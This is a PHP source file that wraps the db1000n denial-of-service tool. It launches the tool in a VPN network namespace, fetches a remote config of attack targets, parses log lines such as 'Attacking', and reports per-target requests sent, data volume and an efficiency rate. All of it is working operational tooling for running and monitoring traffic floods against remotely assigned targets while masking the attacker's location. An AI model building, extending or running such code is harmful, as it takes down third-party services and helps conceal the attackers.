<?php

class db1000nApplication extends HackApplication
{
    private $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $stat = false,
            $db1000nStdoutBrokenLineCount,
            $db1000nStdoutBuffer,
            $exitCode = -1;


    public function processLaunch()
    {
        global $DB1000N_SCALE;

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        $command = "export GOMAXPROCS=1 ;   export SCALE_FACTOR={$DB1000N_SCALE} ;   "
                 . 'ip netns exec ' . $this->vpnConnection->getNetnsName() . '   '
                 . "nice -n 10   /sbin/runuser -p -u hack-app -g hack-app   --   "
                 . __DIR__ . "/db1000n  --prometheus_on=false  " . static::getCmdArgsForConfig() . '   '
                 . "--log-format=json    2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminateAndKill(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    public function pumpLog($flushBuffers = false) : string
    {
        $ret = $this->log;
        $this->log = '';

        if (!$this->readChildProcessOutput) {
            goto retu;
        }

        //------------------- read db1000n stdout -------------------

        $this->db1000nStdoutBuffer .= streamReadLines($this->pipes[1], 0);
        if ($flushBuffers) {
            $ret = $this->stdoutBuffer;
        } else {
            // --- Split lines
            $lines = mbSplitLines($this->db1000nStdoutBuffer);
            // --- Remove empty lines
            $lines = mbRemoveEmptyLinesFromArray($lines);

            foreach ($lines as $lineIndex => $line) {
                $lineObj = json_decode($line);
                if (is_object($lineObj)) {

                    unset($lines[$lineIndex]);
                    $this->db1000nStdoutBrokenLineCount = 0;
                    $ret .= $this->processDb1000nJsonLine($line, $lineObj);

                } else {

                    $this->db1000nStdoutBrokenLineCount++;
                    if ($this->db1000nStdoutBrokenLineCount > 3) {
                        $this->db1000nStdoutBrokenLineCount = 0;
                        $ret .= $line . "\n";
                        unset($lines[$lineIndex]);
                    }
                    break;
                }
            }
            $this->db1000nStdoutBuffer = implode("\n", $lines);
        }

        retu:
        $ret = mbRTrim($ret);

        return $ret;
    }

    private function processDb1000nJsonLine($line, $lineObj)
    {
        $ret = '';

        if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'location info'
        ) {
            $this->currentCountry = $lineObj->country;
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'stats'
        ) {
            if (isset($lineObj->targets)) {
                $this->stat = $lineObj;
            }
        }
        //-----------------------------------------------------
        else if (
               isset($lineObj->level)
            && $lineObj->level === 'info'
            && in_array($lineObj->msg, [
                'running db1000n',
                'Attacking',
                'single http request',
                'loading config',
                'the config has not changed. Keep calm and carry on!',
                'new config received, applying',
                'checking IP address,',
                'job instances (re)started',
                'you might need to enable VPN.'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'warn'
            &&  in_array($lineObj->msg, [
                'error fetching location info',
                'Failed to check the country info'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else {
            $color = Term::clear;
            if (
                   isset($lineObj->level)
                && $lineObj->level === 'info'
            ) {
                $color = Term::gray;
            }
            $ret .= $this->lineObjectToString($lineObj, $color) . "\n\n";
        }

        return $ret;
    }

    public function getStatisticsBadge() : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT;
        if (!$this->stat  ||  !$this->stat->targets) {
            return null;
        }

        if (is_object($this->stat->targets)) {
            $targets = get_object_vars($this->stat->targets);
            ksort($targets);
            $this->stat->targets = $targets;
        }

        if (!count($this->stat->targets)) {
            return null;
        }

        $columnsDefinition = [
            [
                'title' => ['Target'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 11 * 4,
                'trim'  => 4
            ],
            [
                'title' => ['Requests', 'attempted'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Requests' , 'sent'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Responses', 'received'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['MiB', 'sent'],
                'width' => 11,
                'alignRight' => true
            ]
        ];
        $rows[] = [];

        $this->stat->db1000nx100 = new stdClass();
        $this->stat->db1000nx100->totalHttpRequests = 0;
        $this->stat->db1000nx100->totalHttpResponses = 0;
        foreach ($this->stat->targets as $targetName => $targetStat) {
            $mibSent = roundLarge($targetStat->bytes_sent / 1024 / 1024);
            $row = [
                $targetName,
                $targetStat->requests_attempted,
                $targetStat->requests_sent,
                $targetStat->responses_received,
                $mibSent
            ];
            $rows[] = $row;

            //$pattern = '#^https?:\/\/#';
            //if (preg_match($pattern, $targetName, $matches)) {
                $this->stat->db1000nx100->totalHttpRequests  += $targetStat->requests_attempted;
                $this->stat->db1000nx100->totalHttpResponses += $targetStat->responses_received;                
            //}
        }

        //------- Total row
        $rows[] = [];  // new line
        $totalMiBSent = roundLarge($this->stat->total->bytes_sent / 1024 / 1024);
        $row = [
            'Total',
            $this->stat->total->requests_attempted,
            $this->stat->total->requests_sent,
            $this->stat->total->responses_received,
            $totalMiBSent
        ];
        $rows[] = $row;

        return mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
    }

    // Should be called after getLog()
    public function getEfficiencyLevel()
    {

        if (!isset($this->stat->db1000nx100->totalHttpRequests)) {
            return null;
        }

        $requests = $this->stat->db1000nx100->totalHttpRequests;
        $responses = $this->stat->db1000nx100->totalHttpResponses;

        if (!$requests) {
            return null;
        }

        $averageResponseRate = $responses * 100 / $requests;
        return roundLarge($averageResponseRate);
    }

    // Should be called after getLog()
    public function getCurrentCountry()
    {
        return $this->currentCountry;
    }

    public function isAlive()
    {
        if (!is_resource($this->process)) {
            return false;
        }
        $this->getExitCode();

        $processStatus = proc_get_status($this->process);
        return $processStatus['running'];
    }

    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);  // Only first call of this function return real value,
                                                           // next calls return -1.
        if ($processStatus['exitcode'] !== -1) {
            $this->exitCode = $processStatus['exitcode'];
        }
        return $this->exitCode;
    }

    public function terminate($hasError)
    {
        if ($this->processPGid) {
            $this->log("db1000n terminate PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGTERM);
        }
    }

    public function kill()
    {
        if ($this->processPGid) {
            $this->log("db1000n kill PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGKILL);
        }
        @proc_terminate($this->process, SIGKILL);
        @proc_close($this->process);
    }

    // ----------------------  Static part of the class ----------------------

    private static $localConfigPath,
                   $useLocalConfig;

    public static function constructStatic()
    {
        global $TEMP_DIR;

        static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
        static::$useLocalConfig = false;
        Actions::addAction('AfterInitSession', [static::class, 'actionAfterInitSession']);
        killZombieProcesses('db1000n');
    }

    private static function loadConfig()
    {
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );

        $db1000nCfgUpdater     = proc_open(__DIR__ . "/db1000n  --log-format json  -updater-mode  -updater-destination-config " . static::$localConfigPath, $descriptorSpec, $pipes);
        $db1000nCfgUpdaterPGid = procChangePGid($db1000nCfgUpdater);
        if ($db1000nCfgUpdaterPGid === false) {
            MainLog::log('Failed to run db1000n in "config updater" mode');
            return;
        }

        stream_set_blocking($pipes[2], false);
        $timeout = 30;
        $delay = 0.1;
        $configDownloadedSuccessfully = false;

        do {
            $stdout = streamReadLines($pipes[2], 0);
            $lines = mbSplitLines($stdout);
            foreach ($lines as $line) {
                $obj = @json_decode($line);
                if (is_object($obj)) {
                    if ($obj->msg === 'loading config') {
                        MainLog::log('Config file for db1000n downloaded from ' . $obj->path);
                    }
                    if (
                            $obj->msg === 'Saved file'
                        &&  $obj->size > 0
                    ) {
                        $configDownloadedSuccessfully = true;
                        break 2;
                    }
                }
            }
            sayAndWait($delay);
            $timeout -= $delay;
        } while ($timeout > 0);

        @posix_kill(0 - $db1000nCfgUpdaterPGid, SIGTERM);
        if (! $configDownloadedSuccessfully) {
            MainLog::log('Failed to downloaded config file for db1000n');
        }
    }

    private static function getCmdArgsForConfig()
    {
        if (! static::$useLocalConfig) {
            return '';
        }

        return ' -c="' . static::$localConfigPath . '" ';
    }
    
    public static function actionAfterInitSession()
    {
        @unlink(static::$localConfigPath);
        static::loadConfig();
        if (file_exists(static::$localConfigPath)) {
            static::$useLocalConfig = true;
        } else {
            static::$useLocalConfig = false;
        }
    }
}

db1000nApplication::constructStatic();